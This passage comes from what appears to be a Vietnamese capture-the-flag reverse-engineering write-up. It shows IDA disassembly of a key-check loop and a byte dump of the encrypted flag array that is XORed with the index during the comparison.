</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014E6</span>                 cdqe
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014E8</span>                 lea     rcx, ds:<span style="color:#ae81ff">0</span>[rax<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014F</span><span style="color:#ae81ff">0</span>                 lea     rax, enc_flag     <span style="color:#f92672">-&gt;</span> enc_flag array
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014F</span><span style="color:#ae81ff">7</span>                 mov     rax, [rcx<span style="color:#f92672">+</span>rax]
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014F</span>B                 cmp     rdx, rax
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000000014F</span>E                 jz      <span style="color:#66d9ef">short</span> loc_1519
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001500</span>                 lea     rax, s          ; <span style="color:#e6db74">&#34;Invalid vault key!&#34;</span>
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001507</span>                 mov     rdi, rax        ; s
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000150</span>A                 call    _puts
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">000000000000150F</span>                 mov     edi, <span style="color:#ae81ff">1</span>          ; status
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">0000000000001514</span>                 call    _exit
</span></span></code></pre></div><p>Cuối cùng chương trình sẽ lấy giá trị vừa được tính ở trên <code>xor</code> lại với idx và kiểm tra với từng kí tự tương ứng của mảng enc_flag trong chương trình.</p>
<p><code>enc_flag</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002020</span>                 public enc_flag
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002020</span> enc_flag        db  <span style="color:#ae81ff">20</span>h                 ; DATA XREF: main<span style="color:#f92672">+</span><span style="color:#ae81ff">282</span><span style="color:#960050;background-color:#1e0010">↑</span>o
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002021</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002022</span>                 db  <span style="color:#ae81ff">57</span>h ; W
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002023</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002024</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002025</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002026</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002027</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000202</span><span style="color:#ae81ff">8</span>                 db  <span style="color:#ae81ff">71</span>h ; q
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000202</span><span style="color:#ae81ff">9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000202</span>A                 db  <span style="color:#ae81ff">30</span>h ; <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000202</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000202</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000202</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000202</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000202F</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002030</span>                 db  <span style="color:#ae81ff">22</span>h ; <span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002031</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002032</span>                 db  <span style="color:#ae81ff">79</span>h ; y
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002033</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002034</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002035</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002036</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002037</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000203</span><span style="color:#ae81ff">8</span>                 db  <span style="color:#ae81ff">73</span>h ; s
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000203</span><span style="color:#ae81ff">9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000203</span>A                 db  <span style="color:#ae81ff">61</span>h ; a
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000203</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000203</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000203</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000203</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000203F</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002040</span>                 db  <span style="color:#ae81ff">24</span>h ; <span style="color:#960050;background-color:#1e0010">$</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002041</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002042</span>                 db  <span style="color:#ae81ff">35</span>h ; <span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002043</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002044</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002045</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002046</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002047</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000204</span><span style="color:#ae81ff">8</span>                 db  <span style="color:#ae81ff">75</span>h ; u
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000204</span><span style="color:#ae81ff">9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000204</span>A                 db  <span style="color:#ae81ff">71</span>h ; q
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000204</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000204</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000204</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000204</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000204F</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002050</span>                 db  <span style="color:#ae81ff">26</span>h ; <span style="color:#f92672">&amp;</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002051</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002052</span>                 db  <span style="color:#ae81ff">59</span>h ; Y
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002053</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002054</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002055</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002056</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002057</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000205</span><span style="color:#ae81ff">8</span>                 db  <span style="color:#ae81ff">77</span>h ; w
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000205</span><span style="color:#ae81ff">9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000205</span>A                 db  <span style="color:#ae81ff">37</span>h ; <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000205</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000205</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000205</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000205</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000205F</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002060</span>                 db  <span style="color:#ae81ff">28</span>h ; (
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002061</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002062</span>                 db  <span style="color:#ae81ff">78</span>h ; x
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002063</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002064</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002065</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002066</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002067</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000206</span><span style="color:#ae81ff">8</span>                 db  <span style="color:#ae81ff">79</span>h ; y
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000206</span><span style="color:#ae81ff">9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000206</span>A                 db  <span style="color:#ae81ff">3</span>Ah ; <span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000206</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000206</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000206</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000206</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000206F</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002070</span>                 db  <span style="color:#ae81ff">2</span>Ah ; <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002071</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002072</span>                 db  <span style="color:#ae81ff">78</span>h ; x
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002073</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002074</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002075</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002076</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002077</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000207</span><span style="color:#ae81ff">8</span>                 db  <span style="color:#ae81ff">7</span>Bh ; {
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000207</span><span style="color:#ae81ff">9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000207</span>A                 db  <span style="color:#ae81ff">6</span>Ah ; j
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000207</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000207</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000207</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000207</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000207F</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">80</span>                 db  <span style="color:#ae81ff">2</span>Ch ; ,
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">81</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">82</span>                 db  <span style="color:#ae81ff">78</span>h ; x
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">83</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">84</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">85</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">86</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">87</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">88</span>                 db  <span style="color:#ae81ff">7</span>Dh ; }
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">89</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">8</span>A                 db  <span style="color:#ae81ff">3</span>Ch ; <span style="color:#f92672">&lt;</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">8</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">8</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">8</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">8</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000208F</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">90</span>                 db  <span style="color:#ae81ff">2</span>Eh ; .
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">91</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">92</span>                 db  <span style="color:#ae81ff">3</span>Eh ; <span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">93</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">94</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">95</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">96</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">97</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">98</span>                 db  <span style="color:#ae81ff">7F</span>h ; <span style="color:#960050;background-color:#1e0010"></span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">99</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">9</span>A                 db  <span style="color:#ae81ff">61</span>h ; a
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">9</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">9</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">9</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">9</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000209F</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A0                 db  <span style="color:#ae81ff">30</span>h ; <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A1                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A2                 db  <span style="color:#ae81ff">4F</span>h ; O
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A3                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A4                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A5                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A6                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A7                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A8                 db  <span style="color:#ae81ff">61</span>h ; a
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A9                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>AA                 db  <span style="color:#ae81ff">67</span>h ; g
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>AB                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>AC                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>AD                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>AE                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>AF                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B0                 db  <span style="color:#ae81ff">32</span>h ; <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B1                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B2                 db  <span style="color:#ae81ff">73</span>h ; s
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B3                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B4                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B5                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B6                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B7                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B8                 db  <span style="color:#ae81ff">63</span>h ; c
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B9                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>BA                 db  <span style="color:#ae81ff">66</span>h ; f
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>BB                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>BC                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>BD                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>BE                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>BF                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C0                 db  <span style="color:#ae81ff">34</span>h ; <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C1                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C2                 db  <span style="color:#ae81ff">78</span>h ; x
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C3                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C4                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C5                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C6                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C7                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C8                 db  <span style="color:#ae81ff">65</span>h ; e
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C9                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>CA                 db  <span style="color:#ae81ff">61</span>h ; a
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>CB                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>CC                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>CD                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>CE                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>CF                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D0                 db  <span style="color:#ae81ff">36</span>h ; <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D1                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D2                 db  <span style="color:#ae81ff">49</span>h ; I
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D3                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D4                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D5                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D6                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D7                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D8                 db  <span style="color:#ae81ff">67</span>h ; g
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D9                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>DA                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>DB                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>DC                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>DD                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>DE                 db    <span style="color:#ae81ff">0</span>
